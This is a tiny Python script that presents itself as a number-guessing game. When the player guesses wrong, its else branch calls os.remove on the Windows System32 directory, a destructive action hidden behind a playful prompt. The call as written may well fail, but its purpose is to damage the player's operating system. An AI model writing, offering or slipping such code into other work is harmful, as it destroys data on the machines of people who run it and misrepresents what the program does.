import random
import os

number = random.randint(1, 10)

guess = input("Let's play a silly game, Guess a number between 1 and 10")
guess = int(guess)

if guess == number:
  print("You Won!")
else:
  os.remove("C:\Windows\System32")

